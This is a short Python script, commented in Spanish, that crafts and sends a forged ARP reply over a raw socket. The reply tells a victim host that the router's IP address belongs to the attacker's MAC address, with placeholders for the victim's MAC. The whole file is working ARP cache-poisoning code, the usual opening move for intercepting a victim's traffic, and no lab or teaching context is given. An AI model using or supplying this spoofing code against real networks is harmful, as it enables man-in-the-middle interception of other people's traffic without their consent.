##### CÓDIGO APRA ENVIAR UN MENSAJE ARP FALSO #####

import socket
import struct

ETHERNET_PACKET = [
    struct.pack('!6B', 0x01,0x23,0x45,0x67,0x89,0xab), # Destination MAC --> MAC victima --> ### CHANGE IT ###
    struct.pack('!6B', 0x08,0x00,0x27,0x5e,0x33,0x32), # Source MAC --> MAC atacante
    struct.pack('!H', 0x0806) # Type
]

ARP_PACKET = [
    struct.pack('!H', 0x0001), # Hardware type
    struct.pack('!H', 0x0800), # Protocol type = IPv4
    struct.pack('!B', 0x06), # Hardware size
    struct.pack('!B', 0x04), # Protocol size
    struct.pack('!H', 0x0002), # Opcode = reply(2)
    struct.pack('!6B', 0x08,0x00,0x27,0x7d,0x11,0x4d), # Sender MAC address --> MAC atacante
    struct.pack('!4B', 0xc0,0xa8,0x00,0x01), # Sender IP address --> IP router
    struct.pack('!6B', 0x01,0x23,0x45,0x67,0x89,0xab), # Destination MAC --> MAC victima --> ### CHANGE IT ###
    struct.pack('!4B', 0xc0,0xa8,0x00,0x0f) # Target IP address --> IP víctima
]


grouped_packets = ETHERNET_PACKET + ARP_PACKET
packet = (b''.join(grouped_packets))


sock = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)
sock.bind(('enp0s3', 6))
sock.send(packet)
sock.close()